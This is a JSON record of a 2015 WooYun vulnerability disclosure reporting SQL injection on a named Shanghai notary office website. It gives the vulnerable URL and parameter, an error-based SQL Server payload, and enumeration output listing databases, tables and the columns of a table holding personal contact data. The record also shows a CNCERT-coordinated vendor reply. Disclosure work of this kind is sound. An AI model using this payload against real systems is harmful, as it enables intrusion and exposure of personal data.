{"id": 31218, "wybug_id": "wooyun-2015-0114638", "wybug_title": "上海某公证处存在高危漏洞泄漏大量敏感信息", "wybug_corp": "上海市浦东公证处", "wybug_author": "Looke", "wybug_date": "2015-05-27 21:34", "wybug_open_date": "2015-07-16 11:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-16：\t细节向公众公开  简要描述： RT 详细说明：  上海市浦东公证处成立于一九九四年六月，是依法设立，不以营利为目的，依法独立行使公证职能、承担民事责任的证明机构，成立至今的十二年中，上海市浦东公证处围绕着上海市发展的重大项目、热点事项，为金融市场、房地产市场、建筑市场、国有企业的改制或转产等方面提供了优质、高效的公证法律服务，并有效的制止各类经济诈骗及其他违法行为，为社会经济活动的有序正常运行提供了有力保障。经本处参与的重大市政工程项目包括有世纪大道、世纪公园、上海经贸大厦、浦东国际机场等，所提供的公证法律服务质量得到业内外人士的一致肯定和赞赏,还曾先后被评为上海市文明公证处及浦东新区文明单位、先进单位.漏洞地址：\nhttp://www.pdnotary.com/xianshi.aspx?ID=14&biaoti=%E9%80%9A%E5%91%8A%E5%85%AC%E7%9F%A5&biao=announcement\nbiao参数存在注入：\n---Parameter: biao (GET)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: ID=14&biaoti=%E9%80%9A%E5%91%8A%E5%85%AC%E7%9F%A5&biao=announcement WHERE 5042=5042 AND 8164=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(118)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (8164=8164) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(98)+CHAR(122)+CHAR(113)))-----\n   漏洞证明：  数据库：\navailable databases [17]:[*] idchome[*] master[*] model[*] msdb[*] springfine[*] sq_aoge[*] sq_dayabbs[*] sq_dayajituan[*] sq_guledata[*] sq_haowang[*] sq_kaifa[*] sq_lnnj[*] sq_nmegou[*] sq_nmegou2[*] sq_pudong[*] tempdb[*] yssoft\n数据项个数：\nDatabase: sq_pudong+--------------------------------------------------+---------+| Table                                            | Entries |+--------------------------------------------------+---------+| dbo.Appointment                                  | 2334    || dbo.notary                                       | 30      || dbo.consult                                      | 25      || dbo.notarization                                 | 9       || dbo.knowledge                                    | 7       || dbo.announcement                                 | 4       |+--------------------------------------------------+---------+Database: master+--------------------------------------------------+---------+| Table                                            | Entries |+--------------------------------------------------+---------+| sys.messages                                     | 76640   || sys.sysmessages                                  | 76640   || sys.syscolumns                                   | 10759   || sys.all_parameters                               | 6761    || sys.system_parameters                            | 6761    || sys.trace_subclass_values                        | 4729    || sys.trace_event_bindings                         | 3965    || sys.all_columns                                  | 3793    || sys.system_columns                               | 3749    || sys.syscomments                                  | 2793    || dbo.spt_values                                   | 2346    || sys.all_objects                                  | 1779    || sys.sysobjects                                   | 1779    || sys.system_objects                               | 1773    || sys.database_permissions                         | 1675    || sys.syspermissions                               | 1675    || sys.sysprotects                                  | 1674    || sys.all_sql_modules                              | 1621    || sys.system_sql_modules                           | 1621    || sys.all_views                                    | 286     || sys.system_views                                 | 286     || sys.event_notification_event_types               | 193     || sys.trace_events                                 | 171     || sys.syscharsets                                  | 114     || sys.allocation_units                             | 112     || sys.partitions                                   | 101     || sys.system_components_surface_area_configuration | 99      || sys.xml_schema_facets                            | 97      || sys.xml_schema_components                        | 93      || sys.xml_schema_types                             | 77      || sys.trace_columns                                | 65      || sys.configurations                               | 63      || sys.sysconfigures                                | 63      || sys.syscurconfigs                                | 63      || sys.fulltext_document_types                      | 50      || INFORMATION_SCHEMA.COLUMN_PRIVILEGES             | 44      || INFORMATION_SCHEMA.COLUMNS                       | 44      || sys.columns                                      | 44      || sys.syslanguages                                 | 33      || sys.systypes                                     | 27      || sys.types                                        | 27      || sys.securable_classes                            | 21      || sys.trace_categories                             | 21      || sys.database_mirroring                           | 17      || sys.database_recovery_status                     | 17      || sys.databases                                    | 17      || sys.fulltext_languages                           | 17      || sys.sysdatabases                                 | 17      || sys.xml_schema_component_placements              | 17      || INFORMATION_SCHEMA.SCHEMATA                      | 14      || sys.database_principals                          | 14      || sys.schemas                                      | 14      || sys.sysusers                                     | 14      || sys.xml_schema_attributes                        | 14      || sys.server_principals                            | 11      || sys.service_contract_message_usages              | 11      || sys.server_permissions                           | 7       || sys.sysindexes                                   | 7       || sys.indexes                                      | 6       || sys.objects                                      | 6       || sys.stats_columns                                | 6       || INFORMATION_SCHEMA.TABLE_PRIVILEGES              | 5       || INFORMATION_SCHEMA.TABLES                        | 5       || sys.index_columns                                | 5       || sys.sysindexkeys                                 | 5       || sys.tables                                       | 5       || sys.endpoints                                    | 4       || sys.service_queue_usages                         | 3       || sys.stats                                        | 3       || sys.syssegments                                  | 3       || sys.xml_schema_namespaces                        | 3       || sys.database_files                               | 2       || sys.login_token                                  | 2       || sys.service_contract_usages                      | 2       || sys.sql_logins                                   | 2       || sys.sysfiles                                     | 2       || sys.syslogins                                    | 2       || sys.user_token                                   | 2       || dbo.spt_monitor                                  | 1       || sys.backup_devices                               | 1       || sys.data_spaces                                  | 1       || sys.database_role_members                        | 1       || sys.default_constraints                          | 1       || sys.dm_exec_requests                             | 1       || sys.dm_exec_sessions                             | 1       || sys.filegroups                                   | 1       || sys.server_role_members                          | 1       || sys.servers                                      | 1       || sys.sysconstraints                               | 1       || sys.sysdevices                                   | 1       || sys.sysfilegroups                                | 1       || sys.sysmembers                                   | 1       || sys.sysprocesses                                 | 1       || sys.sysservers                                   | 1       || sys.tcp_endpoints                                | 1       || sys.via_endpoints                                | 1       || sys.xml_schema_collections                       | 1       || sys.xml_schema_model_groups                      | 1       || sys.xml_schema_wildcards                         | 1       |+--------------------------------------------------+---------+Database: msdb+--------------------------------------------------+---------+| Table                                            | Entries |+--------------------------------------------------+---------+| dbo.backupfile                                   | 1420    || dbo.backupset                                    | 710     || dbo.backupmediafamily                            | 705     || dbo.backupmediaset                               | 703     || dbo.restorefile                                  | 10      || dbo.restorefilegroup                             | 5       || dbo.restorehistory                               | 5       |+--------------------------------------------------+---------+\n泄漏大量用户数据信息，有姓名、手机号，Email地址及事件信息。\nDatabase: sq_pudongTable: Appointment[8 columns]+----------+----------+| Column   | Type     |+----------+----------+| E-meil   | varchar  || beizhu   | varchar  || Content  | varchar  || ID       | int      || Name     | varchar  || shixiang | varchar  || Tell     | varchar  || Time     | datetime |+----------+----------+\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 Looke@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-06-01 11:19 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给上海分中心，由其后续协调网站管理单位处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}